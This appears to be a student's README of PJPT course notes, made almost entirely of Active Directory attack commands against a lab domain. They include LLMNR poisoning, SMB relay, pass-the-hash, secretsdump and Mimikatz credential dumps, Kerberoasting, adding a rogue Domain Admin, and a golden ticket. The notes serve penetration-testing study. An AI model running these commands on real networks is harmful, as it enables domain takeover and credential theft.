# Hi, I am Yerdaulet and my notes for PJPT.

## 🚀 About Me
I am Junior Penetration Tester.

## 🔗 Links
[![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/yerdauletrash/)
[![tryhackme](https://img.shields.io/badge/tryhackme-1DB954?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com/p/rashy)

# Attacking Active Directory: Initial Attack Vectors
LLMNR Poisoning attack.

Steps

1.Run responder:
```bash
sudo responder -I eth0 -dvw 
```

2.Attacker IP in File Explorer:
```bash 
//attacker ip
```

3.Capturing a hash and cracking it:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

SMB Relay attack.

1.Checking SMB signing with nmap:
```
nmap --script=smb2-security-mode.nse -p445 10.0.0.0
```

2.Switching off HTTP and SMB:
```bash
sudo mousepad /etc/responder/Responder.conf
```

3.Run responder:
```bash
sudo responder -I eth0 -dvw  
```

4.Run ntlmrelayx.py 
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

5.Attacker IP in File Explorer:
```bash 
//attacker ip
```

Other ways.

1.
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
2.
```
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i

nc 127.0.0.1 11000
```


Gaining Shell Access.

1st way:
With Metasploit.
```bash
use exploit/windows/smb/psexec

set SMBDOMAIN <Domain Name>

set SMBUSER <User>

set SMBPASS <Password>
```

2nd Way:
With Metasploit and Administrator hash.
```bash
use windows/smb/psexec

set RHOSTS <IP> 

set SMBUSER Administrator 

set SMBPASS <NTLM Hash>

```

3rd Way and Manually:

```bash
psexec.py MARVEL/fcastle:'Password1'@<ip> - Not a Loud as Metasploit

psexec.py administrator@<ip> -hashes <NTLM Hash>

smbexec.py administrator@<ip> -hashes <NTLM Hash>

wmiexec.py administrator@<dip> -hashes <NTLM Hash>
```


IPv6 DNS Takeover via mitm6

1.Run ntlmrelayz.py:
```bash
sudo ntlmprelayx.py -6 -t ldap://<domain controller ip> -wh fakewpad.marvel.local -l lootme
```

2.Run mitm6:
```bash
sudo mitm6 -d marvel.local
```

3.Analyze Info from lootme file:


# Attacking Active Directory: Post-Compromise Enumeration

With Ldapdomaindump
1.Run below command:
```bash
sudo /usr/bin/ldapdomaindump ldaps://<domain_controller_ip> -u "MARVEL\fcastle" -p Password1
```
2.Analyze captured info:

With BloodHound.
1.Run below command:
```bash
sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns <domain_controller_ip> -c all 
```

2.Upload a file to Bloodhound GUI:

With PlumHound

Neo4j and Bloodhound running
1st Way:
```bash
sudo python3 PlumHound.py --easy -p <Password>
```

2nd Way:
```bash
sudo python3 PlumHound.py -x tasks/default.tasks -p <Password>
```

3.Anlyze Info.

# Attacking Active Directory: Post-Compromise Attacks

Pass the Password:
```bash
crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
```

Dumping hashes with secretsdump:
```bash
secretsdump.py domain.local/fcastle:Password1@10.0.0.25
```

Dumping hashes with secretsdump and Admin:
```bash
secretsdump.py administrator:@10.0.0.25 --hashes <NTLM Hash>
```

Pass the Hash:
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash>
```

Crackmapexec's other commands and for more info use --help:

--local-auth -  Authenticating locally
```
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM HASH> --local-auth 
```

--sam - SAM Hashes 
```
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM HASH> --local-auth --sam

Accessing to Database
cmedb
    hosts
    creds
```

--lsa - LSA Secrets 
```
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash> --local-auth --lsa
```

--shares - Shared Files
```
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash> --local-auth --shares
```

-L - Checking modules

-M - Module
```
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM Hash> --local-auth -M lsassy
```

Kerberoasting.

1.Get a Kerboroas user's hash:
```bash
sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip <domain_controller_ip> -request
```

2.Cracking the hash:
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

Token Impersonation.

1.Get a shell with Metasploit:
```bash
meterpreter > load incognito

meterpreter > list_tokens -u

meterpreter > impersonate_token marvel\\fcastle
```

Adding a User.
```powershell
net user /add hawkeye Password1@ /domain
```

Adding a user into Domain Admins group.
```powershell
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

Mimikatz.

https://github.com/gentilkiwi/mimikatz

Run in Mimikatz:
```bash
mimikatz # privilege::debug
```
Dumping credentials:
```bash
mimikatz # sekurlsa:logonPasswords
```

Golden Ticket:
```
privilege::debug

lsadump:lsa /inject /name:krbtgt - note sid and primary ntlm hash

kerberos::golden /User:FAKE_USER /domain:marvel.local /sid:<sid> /krbtgt:<ntlm hash> /id:500 /ptt

misc::cmd - opens command prompt 

   dir \\THEPUNISHER\$c - accessing to every machine.
```

# Compromised the Domain

Dumping NTDS.dit=>
```bash
secretsdump.py MARVEL.local/pparker:'Password2@'@<domain_controller_ip> -just-dc-ntlm
```

Transfering Files.

1.Powershell for Windows
```powershell
certutil.exe --urlcache -certuil -f http://10.0.0.0/example.txt example.txt
```

2.HTTP server to share files on directory
```bash
python3 -m http.server <port>
```

# Result
[Certificate!](https://www.linkedin.com/feed/update/urn:li:activity:7172077875397967872/)

